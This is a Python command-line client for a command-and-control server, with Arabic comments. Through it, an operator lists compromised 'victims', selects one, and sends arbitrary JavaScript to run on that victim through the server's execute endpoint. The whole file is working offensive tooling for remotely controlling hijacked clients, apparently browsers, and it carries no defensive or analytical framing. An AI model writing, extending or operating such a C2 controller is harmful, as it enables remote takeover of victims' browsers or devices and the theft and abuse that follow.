import cmd
import requests
import json

BASE_URL = "http://127.0.0.1:5000"  # غيّر إلى عنوان السيرفر إذا لزم الأمر

class C2CLI(cmd.Cmd):
    prompt = "C2> "
    intro = "Advanced C2 CLI - Type 'help' for commands"

    def __init__(self):
        super().__init__()
        self.current_victim = None

    def do_list(self, arg):
        """عرض قائمة الضحايا"""
        try:
            r = requests.get(f"{BASE_URL}/api/victims")
            victims = r.json()
            print("\nNo.  ID                                  Status    Last Seen")
            print("-" * 75)
            for i, v in enumerate(victims, start=1):
                print(f"{i:<4} {v['id']:<36} {v['status']:<8} {v['last_seen']}")
        except Exception as e:
            print(f"✗ Error fetching victims: {e}")

    def do_select(self, arg):
        """تحديد الضحية للعمل عليها: select <victim_id>"""
        if not arg:
            print("✗ Usage: select <victim_id>")
            return
        self.current_victim = arg.strip()
        print(f"✓ Selected victim: {self.current_victim}")

    def do_cmd(self, arg):
        """إرسال أمر جافاسكربت للضحية: cmd <js-code>"""
        if not self.current_victim:
            print("✗ No victim selected. Use 'select <victim_id>' first.")
            return
        if not arg:
            print("✗ Usage: cmd <js-code>")
            return
        payload = {
            "victim_id": self.current_victim,
            "command": arg
        }
        try:
            r = requests.post(f"{BASE_URL}/api/execute", json=payload)
            if r.status_code == 200:
                print("✓ Command sent successfully.")
            else:
                print(f"✗ Server returned status: {r.status_code}")
        except Exception as e:
            print(f"✗ Error sending command: {e}")

    def do_exit(self, arg):
        """خروج"""
        print("Exiting...")
        return True

if __name__ == "__main__":
    C2CLI().cmdloop()
